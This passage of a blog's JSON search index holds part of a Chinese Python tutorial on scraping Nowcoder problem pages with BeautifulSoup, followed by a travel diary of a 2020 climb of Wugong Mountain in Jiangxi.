\u5185\u5bb9\u5904\u7406"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#41-limit","text":"\u5148\u4ece\u6bd4\u8f83\u7b80\u5355\u7684\u4fe1\u606f\u5165\u624b\uff0c\u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236\u3002 # Limit # \u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"subject-item-wrap\"})[0].find_all(\"span\") # \u653e\u5165\u5b57\u5178\u4e2d\u5b58\u50a8 data_dict['Title'] = f\"\u725b\u5ba2\u7f51 NC{problemId} \" + soup.title.contents[0] # Time Limit data_dict['Time Limit'] = div[0].contents[0].split('\uff1a')[1] # Memory Limit data_dict['Memory Limit'] = div[1].contents[0].split('\uff1a')[1] \u5b9a\u4e49\u51fd\u6570\uff0c\u5904\u7406\u4e3b\u4f53\u5185\u5bb9\u4e2d\u8be1\u5f02\u7684\u7a7a\u683c\u548c\u516c\u5f0f\u7684\u7b26\u53f7\u3002 def divTextProcess(div): \"\"\" \u5904\u7406<div>\u6807\u7b7e\u4e2d\u7684\u6587\u672c\u5185\u5bb9 \"\"\" # \u83b7\u53d6\u6587\u672c strBuffer = div.get_text() # \u66ff\u6362\u516c\u5f0f\u6807\u8bb0 strBuffer = strBuffer.replace(\"{\", \" $\").replace(\"}\", \"$ \") # \u53bb\u9664\u591a\u4e2a\u7a7a\u683c strBuffer = strBuffer.replace(\" \", \"\") # \u53bb\u9664\u591a\u4e2a\u6362\u884c\u7b26 strBuffer = strBuffer.replace(\"\\n\\n\\n\", \"\\n\") # \u53bb\u9664\u5185\u5bb9\u4e2d\u7528\\xa0\u8868\u793a\u7684\u7a7a\u683c strBuffer = strBuffer.replace(\"\\xa0\", \"\") # \u53bb\u9664\u9996\u4f4d\u7a7a\u683c strBuffer = strBuffer.strip() # \u8fd4\u56de\u7ed3\u679c return strBuffer","title":"4.1. Limit"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#42-problem-description","text":"\u83b7\u53d6\u9898\u76ee\u63cf\u8ff0 # \u5904\u7406\u9898\u76ee\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\": \"subject-question\"})[0] data_dict['Problem Description'] = divTextProcess(div)","title":"4.2. Problem Description"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#43-input","text":"\u8f93\u5165\u63cf\u8ff0 div = mainContent.find_all(name=\"pre\")[0] data_dict['Input'] = divTextProcess(div)","title":"4.3. Input"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#44-output","text":"\u8f93\u51fa\u63cf\u8ff0 div = mainContent.find_all(name=\"pre\")[1] data_dict['Output'] = divTextProcess(div)","title":"4.4. Output"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#45-sample-input-output","text":"\u8f93\u5165\u6837\u4f8b\uff0c\u7528\u4ee3\u7801\u6846\u73af\u5883\u5305\u56f4\u3002 # Input div = mainContent.find_all(name=\"div\", attrs={\"class\":\"question-oi-cont\"})[0] data_dict['Sample Input'] = \"```cpp\" + div.get_text() + '```' # Onput div = mainContent.find_all(name=\"div\", attrs={\"class\":\"question-oi-cont\"})[1] data_dict['Sample Output'] = \"```cpp\" + div.get_text() + '```'","title":"4.5. Sample Input &amp; Output"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#46-note","text":"\u5907\u6ce8 # \u82e5\u6709\u5907\u6ce8 if len(mainContent.find_all(name=\"pre\")) >= 5: div = mainContent.find_all(name=\"pre\")[-1] data_dict['Note'] = divTextProcess(div)","title":"4.6. Note"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#47-source","text":"\u9898\u76ee\u94fe\u63a5 data_dict['Source'] = '[' + data_dict['Title'] + ']' + '(' + url + ')'","title":"4.7. Source"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/2.Python%E7%88%AC%E5%8F%96%E7%89%9B%E5%AE%A2%E7%BD%91%E9%A2%98%E7%9B%AE/#5","text":"for each in data_dict.keys(): print('### ' + each + '\\n') print(data_dict[each].replace(\"\\n\\n**\", \"**\").replace(\"**\\n\\n\", \"**\") + '\\n') \u4e0b\u9762\u662f\u6700\u540e\u7684\u8f93\u51fa\u7ed3\u679c ### Title \u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f ### Time Limit C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 ### Memory Limit C/C++ 524288K\uff0c\u5176\u4ed6\u8bed\u8a001048576K ### Problem Description \u725b\u725b\u6700\u8fd1\u559c\u6b22\u73a9\u54aa\u54aa\u6e38\u620f\uff0c\u4e8e\u662f\u81ea\u5df1\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7f16\u4e86\u4e2a\u6e38\u620f\u8ba9\u725b\u59b9\u6765\u73a9\u3002\u6e38\u620f\u662f\u8fd9\u6837\u7684\uff1a \u725b\u725b\u6709\u4e00\u4e2a\u957f\u7684\u5b57\u7b26\u4e32\uff08\u53ea\u530526\u542b\u4e2a\u5c0f\u5199\u5b57\u6bcd\uff09\uff0c\u4ed6\u60f3\u8ba9\u725b\u59b9\u5224\u65ad\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u597d\u7684\u3002 \u5b9a\u4e49\u4e00\u4e2a\u4e32\u662f\u597d\u7684\uff1a\u8fd9\u4e2a\u4e32\u662f\u7531\u8fde\u7eed\u7684mq\u8fde\u63a5\u800c\u6210\u7684\u3002 \u6bd4\u5982 $mqmq$ \u8bf4\u660e\u8fd9\u4e2a\u4e32\u662f\u597d\u7684\uff0c $mqmqm$ \u6216 $mqmqx$ \u90fd\u662f\u4e0d\u597d\u7684\u3002\u73b0\u5728\u725b\u725b \u60f3\u95ee\u725b\u59b9\u8fd9\u4e2a\u4e32\u662f\u5426\u662f\u597d\u7684\uff0c\u5982\u679c\u597d\u7684\u8f93\u51fa $Yes$ \uff0c\u5426\u5219\u8f93\u51fa $No$ ### Input \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570Q\uff0c\u8868\u793a\u8be2\u95ee\u6b21\u6570 \u5c31\u4e0b\u6765Q\u884c\uff0c\u4e00\u4e2a\u5b57\u7b26\u4e32$s ### Onput Q\u884c\uff0c\u6bcf\u884c\u8f93\u51fa $Yes$ \u6216 $No$ ### Sample Input // \u8fd9\u91cc\u4f1a\u6709```cpp\u4ee3\u7801\u73af\u5883\uff0c\u5728\u8fd9\u91cc\u4e3a\u4e86\u5c55\u793a\u65b9\u4fbf\u53bb\u6389\u4e86 4 mqmq mqmqm mqakioi mqqmmq ### Sample Output Yes No No No ### Note \u5bf9\u4e8e $60\\%$ \u7684\u6570\u636e\u6ee1\u8db3\uff1a $|s|<=10,Q<=10$ \u4e14\u4fdd\u8bc1\u53ea\u51fa\u73b0m,q\u4e24\u4e2a\u5b57\u7b26 \u5bf9\u4e8e $100\\%$ \u7684\u6570\u636e\uff1a $|s| <=10^5,Q<=10$ \u5bf9\u4e8e\u6240\u6709\u6570\u636e\u4fdd\u8bc1\u53ea\u51fa\u73b026\u4e2a\u82f1\u6587\u5c0f\u5199\u5b57\u6bcd ### Source [\u725b\u5ba2\u7f51 NC204552 \u54aa\u54aa\u6e38\u620f](https://ac.nowcoder.com/acm/problem/204552) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u8f93\u51fa"},{"location":"%E6%97%85%E8%A1%8C%E7%AC%94%E8%AE%B0/%E6%B1%9F%E8%A5%BF/1.2020_7_14_%E8%90%8D%E4%B9%A1%E6%AD%A6%E5%8A%9F%E5%B1%B1/","text":"2020.7.14 \u840d\u4e61\u6b66\u529f\u5c71 # \u76ee\u5f55 # 2020.7.14 \u840d\u4e61\u6b66\u529f\u5c71 \u76ee\u5f55 1. \u80cc\u666f 2. \u51fa\u884c\u51c6\u5907 2.1. \u91c7\u8d2d\u7269\u54c1 2.2. \u4ea4\u901a\u8def\u7ebf 2.3. \u4f4f\u5bbf\u5b89\u6392 3. \u767b\u5c71\u4e4b\u65c5 3.1. \u5230\u8fbe 3.2. \u4e2d\u5eb5\u7d22\u9053 3.3. \u7b2c\u4e00\u6bb5\u6b65\u884c 3.4. \u91d1\u9876\u7d22\u9053 3.5. \u7b2c\u4e8c\u6bb5\u6b65\u884c 3.6. \u767b\u9876 4. \u603b\u7ed3 1. \u80cc\u666f # 2020\u5e747\u670810\u65e5\u665a\u4e0a10\u70b921\u5206 \uff0c\u6211\u7684\u9ad8\u4e2d\u540c\u5b66\u7b11\u7b11\u95ee\u6211 7\u670814\u65e5 \u60f3\u4e0d\u60f3\u53bb\u722c\u5c71\u3002\u8054\u60f3\u5230\u73b0\u5728\u5bf9\u722c\u5c71\u7684\u5b9a\u4e49\uff0c\u6211\u4e0d\u7981\u5fc3\u4e2d\u4e00\u7d27\uff0c\u6e05\u7b97\u7740\u6211\u4eec\u662f\u4e0d\u662f\u6709\u4ec0\u4e48\u672a\u89e3\u51b3\u7684\u6069\u6028\uff0c\u76f4\u5230\u5979\u628a\u76ee\u7684\u5730\u3001\u884c\u7a0b\u548c\u540c\u884c\u4eba\u5458\u53d1\u7ed9\u6211\uff0c\u6211\u624d\u786e\u4fe1\u8fd9\u662f\u4e00\u6b21 \u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u722c\u5c71\u6d3b\u52a8 \uff0c\u4e8e\u662f\u6b23\u7136\u63a5\u53d7\u3002 \u6211\u4eec\u8ba1\u5212\u7684\u884c\u7a0b\u662f7\u670814\u65e5\u4ece\u8d63\u5dde\u51fa\u53d1\uff0c\u81ea\u9a7e\u524d\u5f80\u840d\u4e61\u6b66\u529f\u5c71\u666f\u533a\uff0c\u5f53\u5929\u5728\u5c71\u9876\u5165\u4f4f\u91d1\u9876\u5e10\u7bf7\uff0c\u7b2c\u4e8c\u5929\u4e0b\u5c71\u4f11\u606f\uff0c7\u670816\u65e5\u8fd4\u56de\u3002\u5728\u4e0b\u5c71\u7684\u8def\u4e0a\uff0c\u6211\u60f3\u5230\u53ef\u4ee5\u5199\u4e00\u7bc7\u6e38\u8bb0\u6765\u8bb0\u5f55\u6b64\u6b21\u7684\u65c5\u884c\u611f\u53d7\uff0c\u4f46\u8fd9\u5bf9\u4e60\u60ef\u5199\u6280\u672f\u535a\u5ba2\u7684\u6211\u6765\u8bf4\u7740\u5b9e\u6709\u4e9b\u56f0\u96be\u3002\u4e8e\u662f\uff0c\u6211\u53c2\u8003\u4e86\u4e00\u4e9b\u5176\u4ed6\u6e38\u5ba2\u6240\u5199\u7684\u6e38\u8bb0\uff0c\u8fd8\u6709\u4e00\u4e9b\u51fa\u7248\u7684\u6e38\u8bb0\u4f5c\u54c1\uff0c\u6700\u7ec8\u5199\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u5e0c\u671b\u80fd\u591f\u7ed9\u60f3\u8981\u53bb\u6b66\u529f\u5c71\u65c5\u6e38\u7684\u670b\u53cb\u63d0\u4f9b\u4e00\u4e9b\u53c2\u8003\u3002 2. \u51fa\u884c\u51c6\u5907 # 2.1. \u91c7\u8d2d\u7269\u54c1 # \u8981\u5916\u51fa\u767b\u5c71\uff0c\u8fd8\u662f\u5728\u5c71\u9876\u9732\u8425\uff0c\u5fc5\u7136\u8981\u51c6\u5907\u4e00\u4e9b\u7269\u54c1\uff0c\u4e0b\u9762\u662f\u6211\u5217\u51fa\u7684\u91c7\u8d2d\u6e05\u5355\u3002 [x] \u5e3d\u5b50 [x] \u957f\u8863\u957f\u88e4 \uff0d\u906e\u9633 [x] \u9632\u6652\u8863 [x] \u9632\u6652\u971c [x] \u51b2\u950b\u8863 \uff0d \u5c71\u9876\u6e29\u5ea6\u6bd4\u5c71\u4e0b\u4f4e12\u5ea6\u5de6\u53f3\uff0c\u591c\u95f4\u5916\u51fa\u9700\u8981\u9632\u98ce\u4fdd\u6696\u7684\u8863\u7269 [x] \u6d17\u6f31\u7528\u54c1\u65c5\u884c\u88c5 \uff0d \u5c71\u9876\u6709\u6d17\u6fa1\u95f4\uff0c20\u514310\u5206\u949f [x] \u5bc6\u5c01\u888b \uff0d \u9694\u79bb\u6362\u4e0b\u6765\u7684\u8863\u7269\uff0c\u8fd8\u80fd\u7528\u6765\u5bc6\u5c01\u978b\u5b50\uff0c\u9632\u6b62\u5728\u591c\u95f4\u88ab\u9732\u6c34\u6253\u6e7f [x] \u521b\u53ef\u8d34 [x] \u6bcf\u4eba\u4e24\u74f6\u6c34 [x] \u4e00\u76d2\u7eb8\u5dfe [x] \u5c0f\u96f6\u98df \uff0d \u4e0a\u5c71\u9014\u4e2d\u8865\u5145\u80fd\u91cf [x] \u767b\u5c71\u6756 \uff0d \u8ba9\u53cc\u624b\u80fd\u591f\u5206\u62c5\u817f\u90e8\u53d7\u529b\uff0c\u4fdd\u62a4\u819d\u76d6 [x] \u73b0\u91d1200 \uff0d \u5c71\u4e0a\u53ea\u6709\u79fb\u52a8\u6709\u4fe1\u53f7\uff0c\u65f6\u65ad\u65f6\u7eed\uff0c\u5e26\u73b0\u91d1\u4ee5\u5907\u4e0d\u65f6\u4e4b\u9700 [x] \u624b\u7535\u7b52 \uff0d \u591c\u95f4\u7167\u660e [x] \u8eab\u4efd\u8bc1 \uff0d \u8d2d\u7968\u9700\u8981 [x] \u82b1\u9732\u6c34 \uff0d \u9632\u868a [x] \u7761\u888b \uff0d \u6bcf\u4e2a\u5e10\u7bf7\u914d\u4e00\u5e8a\u68c9\u88ab\u548c\u4e00\u4e2a\u7761\u888b\uff0c\u4e0d\u7ecf\u5e38\u6362\u6d17\uff0c\u81ea\u5df1\u5e26\u7761\u888b\u4e0a\u53bb\u6bd4\u8f83\u5e72\u51c0\u536b\u751f [x] \u964d\u566a\u8033\u673a\u6216\u8033\u585e \uff0d \u5e10\u7bf7\u653e\u7f6e\u5bc6\u96c6\uff0c\u4e14\u4e0d\u9694\u97f3\uff0c\u591c\u95f4\u5608\u6742 [x] \u4e00\u6b21\u6027\u96e8\u8863 \uff0d \u5c71\u4e0a\u5e38\u5e74\u6709\u96e8 [x] \u9632\u6c34\u978b\u6216\u96e8\u978b\u5957 2.2. \u4ea4\u901a\u8def\u7ebf # \u6211\u4eec\u662f\u4ece\u8d63\u5dde\u81ea\u9a7e\u8fc7\u53bb\u7684\uff0c\u65e9\u4e0a\u516b\u70b9\u51fa\u53d1\uff0c\u4e0b\u5348\u56db\u70b9\u5230\u8fbe\u3002\u6211\u4eec\u4f7f\u7528\u767e\u5ea6\u5730\u56fe\u5bfc\u822a\uff0c\u4ece\u840d\u4e61\u4e0b\u9ad8\u901f\u5230\u6b66\u529f\u5c71\u7684\u8def\u7279\u522b\u4e0d\u597d\u8d70\uff0c\u540e\u6765\u53d1\u73b0\u7528\u9ad8\u5fb7\u5730\u56fe\u53ef\u4ee5\u8d70\u4e00\u6761\u597d\u8d70\u8bb8\u591a\u7684\u9053\u8def\u3002 \u770b\u6765\u767e\u5ea6\u5728\u66f4\u65b0\u8def\u7ebf\u4e0a\u7684\u5de5\u4f5c\u8fd8\u662f\u6ca1\u6709\u9ad8\u5fb7\u7684\u6295\u5165\u5927\u3002 2.3. \u4f4f\u5bbf\u5b89\u6392 # \u6211\u4eec\u8d2d\u4e70\u7684\u662f\u666f\u533a\u95e8\u7968\u548c\u91d1\u9876\u5e10\u7bf7\u7684\u5957\u7968\uff0c\u6bcf\u4e24\u4eba245\u3002\u91d1\u9876\u5e10\u7bf7\u5728\u6cbf\u7740\u4e0a\u5c71\u8def\u5f84\u5230\u8fbe\u91d1\u9876\u4ee5\u540e\u5f80\u4e0b\u770b\u5c31\u80fd\u770b\u5230\uff0c\u9700\u8981 \u5148\u53bb2\u53f7\u697c\u901a\u8fc7\u8eab\u4efd\u8bc1\u529e\u7406\u5165\u4f4f \uff0c\u7136\u540e\u53bb\u6307\u5b9a\u7684\u697c\u6311\u9009\u5e10\u7bf7\u5e76\u9886\u53d6\u7269\u54c1\uff0c\u4e00\u5e8a\u68c9\u88ab\uff0c\u4e00\u4e2a\u7761\u888b\u548c\u4e00\u4e2a\u9632\u6f6e\u57ab\u3002 3. \u767b\u5c71\u4e4b\u65c5 # 3.1. \u5230\u8fbe # \u5230\u8fbe\u6e38\u5ba2\u670d\u52a1\u4e2d\u5fc3\u4ee5\u540e\uff0c\u4e58\u5750\u5df4\u8f66\uff0c20\u5206\u949f\u5de6\u53f3\u5230\u8fbe\u5c71\u811a\u3002 \u5c71\u811a\u4e0b\u7684\u724c\u697c\u5b88\u62a4\u7740\u8fdc\u5904\u7684\u9ad8\u5c71\uff0c\u7ed9\u4eba\u4ee5\u5dcd\u5ce8\u4e4b\u611f\u3002 \u6b66\u529f\u5c71\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u65f6\u4e0d\u65f6\u7ed9\u4eba\u60ca\u559c\u7684\u5730\u65b9\u3002\u8de8\u4e0a\u4e00\u6bb5\u53f0\u9636\uff0c\u8d70\u8fc7\u4e00\u6761\u6808\u9053\uff0c\u6216\u8bb8\u4fbf\u6709\u522b\u81f4\u7684\u666f\u8272\u5728\u7b49\u5f85\u7740\u4f60\u3002 3.2. \u4e2d\u5eb5\u7d22\u9053 # \u8fc7\u4e86\u724c\u697c\uff0c\u4fbf\u662f\u4e2d\u5eb5\u7d22\u9053\uff0c\u6211\u4eec\u60a0\u95f2\u5730\u5750\u5728\u7f06\u8f66\u4e0a\uff0c\u88ab\u7fa4\u5c71\u6240\u73af\u7ed5\uff0c \u811a\u4e0b\u94fa\u5f00\u4e00\u7247\u6797\u6d77\uff0c\u5934\u9876\u7f69\u7740\u4e00\u7247\u4e91\u6d77 \u3002\u7f06\u8f66\u4e00\u5171\u5f00\u4e8610\u5206\u949f\uff0c\u5c31\u50cf\u843d\u5165\u4e86\u300a\u7231\u4e3d\u4e1d\u6f2b\u6e38\u4ed9\u5883\u300b\u4e2d\u7684\u5154\u5b50\u6d1e\uff0c\u79bb\u771f\u5b9e\u4e16\u754c\u7684\u8ddd\u79bb\u9010\u6e10\u62c9\u8fdc\u3002\u968f\u4e4b\u4e00\u540c\u62c9\u8fdc\u7684\uff0c\u8fd8\u6709\u9753\u6960\u56e0\u4e3a\u975e\u5178\u578b\u6027\u8f7b\u5ea6\u6050\u9ad8\u75c7\u800c\u53d1\u51fa\u7684\u9635\u9635\u5c16\u53eb\u3002 3.3. \u7b2c\u4e00\u6bb5\u6b65\u884c # \u4ece\u7f06\u8f66\u4e0a\u4e0b\u6765\uff0c\u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u722c\u5c71\u5c31\u8981\u5f00\u59cb\u4e86\u3002\u7d22\u9053\u51fa\u53e3\u5904\u7ad9\u7740\u4e00\u4e9b\u6311\u592b\u548c\u8f7f\u592b\uff0c\u4ed6\u4eec\u7684\u624b\u81c2\u4e0a\u6709\u7740\u866c\u7ed3\u7684\u808c\u8089\uff0c\u5c0f\u817f\u4e0a\u7684\u8840\u7ba1\u7a81\u51fa\uff0c\u80a9\u5934\u56e0\u4e3a\u957f\u671f\u62c5\u8d1f\u91cd\u7269\u800c\u5fae\u5fae\u9686\u8d77\u3002 \u4ed6\u4eec\u7528\u70ed\u5207\u7684\u773c\u5149\u770b\u7740\u6211\u4eec\uff0c\u9ad8\u58f0\u5730\u95ee\u6211\u4eec\u8981\u4e0d\u8981\u5750\u8f7f\u5b50\u4e0a\u5c71 \u3002 \u4e00\u8def\u821f\u8f66\u52b3\u987f\uff0c\u518d\u52a0\u4e0a\u643a\u5e26\u7684\u884c\u674e\u6709\u4e0d\u5c0f\u7684\u91cd\u91cf\uff0c\u6211\u4eec\u7565\u5fae\u6709\u4e9b\u5fc3\u52a8\uff0c\u8be2\u95ee\u4e86\u4e00\u4e0b\u4ef7\u683c\uff0c 460\u4e00\u4f4d \u3002\u4e00\u65f6\u95f4\uff0c\u6211\u4eec\u8170\u4e5f\u4e0d\u9178\u4e86\uff0c\u817f\u4e5f\u4e0d\u75bc\u4e86\uff0c\u884c\u674e\u81ea\u5df1\u4e5f\u80fd\u625b\u4e86\u3002 \u4e00\u4f4d\u6bd4\u8f83\u80fd\u8bf4\u7684\u8f7f\u592b\u770b\u6211\u4eec\u662f\u6f5c\u5728\u5ba2\u6237\uff0c\u4e00\u8def\u8ddf\u4e86\u6211\u4eec5\u5206\u949f\uff0c\u7528\u5938\u5f20\u7684\u8bed\u6c14\u548c\u795e\u60c5\u5411\u8be2\u95ee\u4ef7\u683c\u7684\u7b11\u7b11\u63cf\u8ff0\u7740\u4e0a\u5c71\u8def\u9014\u4e4b\u51f6\u9669\u3002 \u6211\u60f3\uff0c\u5982\u679c\u662f\u4ed6\u6765\u5199\u8fd9\u7bc7\u6e38\u8bb0\u7684\u8bdd\uff0c\u6211\u4eec\u7684\u65c5\u9014\u5e94\u5f53\u4f1a\u663e\u5f97\u523a\u6fc0\u8bb8\u591a \u3002 \u88ab\u4e00\u8def\u8ffd\u968f\u7684\u6211\u4eec\u4e5f\u6709\u4e9b\u4e0d\u80dc\u5176\u6270\uff0c\u4e8e\u662f\u6211\u5f00\u59cb\u5411\u5927\u54e5\u6781\u529b\u63cf\u5199\u7740\u7b11\u7b11\u662f\u5982\u4f55\u5730\u56fa\u6267\uff0c \u5f53\u5e74\u5728\u5b66\u6821\u6709\u591a\u5c11\u7eaf\u60c5\u7684\u5c0f\u7537\u751f\u8d39\u5c3d\u5fc3\u601d\u5730\u60f3\u8981\u8ffd\u5979\u90fd\u6ca1\u6709\u6210\u529f\uff0c\u4e0d\u53ef\u80fd\u88ab\u5927\u54e5\u4e0a\u4e2a\u5c71\u5c31\u8ffd\u4e0a\u7684 \uff0c\u8fd8\u6709\u521a\u521a\u4ece\u7d22\u9053\u51fa\u53e3\u51fa\u6765\u7684\u5c0f\u59b9\u59b9\u662f\u5982\u4f55\u5730\u67d4\u5f31\uff0c\u5927\u54e5\u5982\u679c\u518d\u4e0d\u53bb\u62c9\u5ba2\u7684\u8bdd\u5c31\u8981\u88ab\u522b\u4eba\u62a2\u8d70\u751f\u610f\u4e86\u3002 \u6bd5\u7adf\u6211\u4e5f\u662f\u5728\u5546\u79d1\u8bfb\u8fc7\u4e24\u5e74\uff0c\u9500\u552e\u8bdd\u672f\u8bf4\u8d77\u6765\u4e5f\u662f\u4e00\u5957\u4e00\u5957\u7684\uff0c\u5927\u54e5\u542c\u5b8c\u7565\u6709\u6240\u601d\uff0c\u89c9\u5f97\u6211\u8bf4\u5f97\u6709\u9053\u7406\uff0c\u4e8e\u662f\u4fbf\u4e0b\u5c71\u53bb\u627e\u5c0f\u59b9\u59b9\u4e86\u3002\u6211\u677e\u4e86\u4e00\u53e3\u6c14\uff0c\u628a\u4ece\u5305\u91cc\u638f\u51fa\u6765\u51c6\u5907\u753b SWOT\u5206\u6790 \u7684\u7eb8\u548c\u7b14\u653e\u4e86\u56de\u53bb\u3002 \u6b66\u529f\u5c71\u6700\u5927\u7684\u7279\u70b9\u5728\u7b2c\u4e00\u6bb5\u6b65\u884c\u9014\u4e2d\u4fbf\u9010\u6e10\u663e\u73b0\u51fa\u6765\uff0c \u9ad8\u5904\u591a\u4e91\u96fe \u3002 \u4e00\u9897\u677e\u6811\u4f18\u96c5\u5730\u957f\u5728\u6808\u9053\u7684\u4e2d\u95f4\uff0c \u679d\u53f6\u5411\u5929\u7a7a\u4f38\u5c55 \u3002 \u5c71\u8272\u5cbf\u7136\u4e0d\u52a8\uff0c\u6d6e\u4e91\u53d8\u5316\u591a\u7aef\u3002\u5f80\u6765\u5982\u7ec7\u7684\u6e38\u5ba2\u4eec\u62cd\u4e0b\u7684\u5c71\u666f\u6216\u8bb8\u5927\u540c\u5c0f\u5f02\uff0c\u5374\u4eab\u6709\u7740\u72ec\u6b64\u4e00\u4efd\u7684\u5929\u7a7a\uff0c\u8fd9\u53ef\u80fd\u4e5f\u7b97\u662f\u6b66\u529f\u5c71\u7ed9\u6e38\u5ba2\u4eec\u7684\u5b9a\u5236\u5316\u4f53\u9a8c\u5427\u3002 3.4. \u91d1\u9876\u7d22\u9053 # \u6211\u4e5f\u4e0d\u77e5\u9053\u8fd9\u5f20\u4e0b\u5c71\u65f6\u62cd\u7684\u7167\u7247\u662f\u4e0d\u662f\u91d1\u9876\u7d22\u9053\uff0c\u53cd\u6b63\u662f\u7d22\u9053\u5c31\u5bf9\u4e86\u3002 3.5. \u7b2c\u4e8c\u6bb5\u6b65\u884c # \u4ece\u91d1\u9876\u7d22\u9053\u7684\u7f06\u8f66\u4e0a\u4e0b\u6765\uff0c\u6d77\u62d4\u5df2\u7ecf\u67091600\u7c73\uff0c\u5269\u4e0b\u7684\u8def\u5c31\u4e0d\u591a\u4e86\u3002 \u4f53\u529b\u5145\u6c9b\u7684\u5fd7\u6d69\u8def\u9014\u603b\u662f\u9886\u5148\u6211\u4eec\u8bb8\u591a\uff0c\u4f46\u662f\u4ed6\u53ea\u8981\u4e00\u9047\u5230\u5c0f\u5356\u90e8\u5c31\u4f1a\u5fcd\u4e0d\u4f4f\u8fdb\u53bb\u901b\u4e00\u901b\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u8981\u770b\u5230\u5c0f\u5356\u90e8\uff0c\u5c31\u77e5\u9053\u6211\u4eec\u53c8\u53ef\u4ee5\u8ffd\u4e0a\u4ed6\u4e86\uff0c\u987a\u4fbf\u5728\u4ed6\u7684\u76db\u60c5\u9080\u8bf7\u4e0b\u6765\u4e00\u74f6\u53ef\u4e50\u548c\u4e00\u6839\u70e4\u80a0\u3002 \u63a5\u8fd1\u5c71\u9876\u65f6\uff0c\u6211\u4eec\u80fd\u591f\u770b\u5230\u4e00\u6761\u5c0f\u8def\uff0c\u5b83\u662f\u9ad8\u5c71\u8349\u7538\u548c\u6797\u5e26\u7684\u5206\u754c\u7ebf\uff0c\u81ea\u7136\u548c\u4eba\u5de5\u76f8\u914d\u5408\u5f62\u6210\u7684\u6b64\u756a\u666f\u8272\uff0c\u9887\u4e3a\u522b\u81f4\u3002 \u592a\u9633\u4e00\u51fa\u6765\uff0c\u4e91\u96fe\u5f00\u59cb\u5411\u4e0a\u6d88\u6563\u3002\u821e\u53f0\u4e0a\u5927\u6982\u662f\u7528\u4e0d\u4e86\u8fd9\u4e48\u591a\u5e72\u51b0\u6765\u5236\u9020\u7279\u6548\u7684\u3002 3.6. \u767b\u9876 # \u8d70\u8fc7\u6700\u540e\u4e00\u6761\u6808\u9053\uff0c\u6211\u4eec\u5c31\u6765\u5230\u4e86\u91d1\u9876\u3002\u7d27\u8d76\u6162\u8d76\uff0c\u4e00\u5171\u82b1\u4e862\u5c0f\u65f640\u5206\u949f\u3002\u4ece\u91d1\u9876\u5f80\u4e0b\u770b\uff0c\u6700\u8fd1\u7684\u662f\u767d\u9e64\u5cf0\u5e10\u7bf7\uff0c\u518d\u4e0b\u4e00\u5c42\u624d\u662f\u91d1\u9876\u5e10\u7bf7\u3002 \u4f11\u6574\u4e00\u591c\uff0c\u51cc\u6668\u56db\u70b9\u534a\uff0c\u7aa5\u89c1\u4e86\u915d\u917f\u7740\u65e5\u51fa\u7684\u5929\u7a7a\u3002 